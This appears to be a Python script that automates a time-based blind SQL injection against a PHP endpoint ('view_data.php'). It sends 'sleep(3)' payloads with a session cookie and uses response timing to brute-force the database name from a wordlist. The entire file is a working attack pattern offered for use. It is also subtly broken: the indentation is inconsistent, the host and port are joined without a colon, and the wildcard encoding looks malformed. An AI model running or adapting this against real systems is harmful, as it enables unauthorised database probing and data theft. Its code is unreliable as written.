import requests
import time


def main(filename="SQLattack.txt"):
    
        ip = "0.0.0.0"
        port = 1234
        cookie_id = ""
        
    with open(filename, "r") as fin:
        lines = fin.readlines()
        url_part1 = "http://" + ip + str(port) + "/view_data.php?period_id=1%20and%20(select%20sleep(3)%20from%20dual%20where%20database()%20like%20%27%"
        url_part2 = "%%27)--+"
        for line in lines:
            start = time.time()
            line = line.split("\n")[0]
            url = "%s%s%s" % (url_part1, line, url_part2)
            # cookie handling
            cookie = {'PHPSESSID': cookie_id}
            r = requests.post(url, cookies=cookie)
            print(url)
            print(r)
            end = time.time()
            full_time = end - start
            if full_time > 2:
                print("This Key:", line, "Is found")


main()
